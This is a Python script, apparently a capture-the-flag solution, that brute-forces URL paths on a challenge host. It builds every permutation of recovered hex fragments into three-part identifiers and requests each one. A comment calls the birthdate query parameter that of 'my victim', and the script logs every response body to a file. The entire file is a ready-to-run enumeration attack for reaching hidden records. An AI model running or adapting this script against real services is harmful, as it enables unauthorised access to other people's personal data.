import itertools
import requests

# === USER CONFIGURATION ===
hex_chunks = [
    '7be54a88fa','d0f5af22fb',
    '0ecb22','5cfea3','4d0633','d6c97d',
    '19ebb9','5c599a','40f618','387835','59a95','8842'
]

required_chunks = []

# Total UUIDs to use (3 UUIDs required by the URL)
uuid_count = 3

# Output file
log_file = "salesforce_results.txt"

# URL template with placeholders
BASE_URL = "https://target-flask.chals.io/vendor/salesforce/tuvok/{}/{}?v={}&b=1969-07-22" # 1969-07-22 is my victim's birthdate
# === END CONFIGURATION ===

def generate_valid_sets(chunks, required_chunks):
    if len(required_chunks) > uuid_count:
        print("[!] Too many required chunks.")
        return []

    remaining = [c for c in chunks if c not in required_chunks]
    num_extra = uuid_count - len(required_chunks)

    valid_sets = []
    for combo in itertools.combinations(remaining, num_extra):
        full = required_chunks + list(combo)
        for perm in itertools.permutations(full):
            valid_sets.append(perm)

    print(f"[+] Generated {len(valid_sets)} valid URL sets.")
    return valid_sets

def test_urls(sets):
    print("[*] Starting request tests...\n")
    with open(log_file, "w", encoding="utf-8") as f:
        for i, (u1, u2, u3) in enumerate(sets):
            url = BASE_URL.format(u1, u2, u3)
            print(f"[{i+1}] Testing: {url}")
            try:
                response = requests.get(url)
                print(f" → Status: {response.status_code}")
                if response.status_code == 200:
                    print(" → ✅ Success")
                f.write(f"URL: {url}\nStatus: {response.status_code}\nResponse: {response.text}\n\n")
            except requests.RequestException as e:
                print(f" → ❌ Error: {e}")
                f.write(f"URL: {url}\nError: {e}\n\n")

if __name__ == "__main__":
    print("=== Tuvok UUID Tester ===\n")
    print(f"[*] Chunks provided: {len(hex_chunks)}")
    print(f"[*] Required chunks: {required_chunks}\n")

    if len(hex_chunks) < uuid_count:
        print("[!] Not enough chunks to generate a full URL.")
    else:
        sets = generate_valid_sets(hex_chunks, required_chunks)
        if sets:
            test_urls(sets)
        else:
            print("[!] No valid UUID combinations generated.")

    print("\n[*] Done. Results saved to:", log_file)
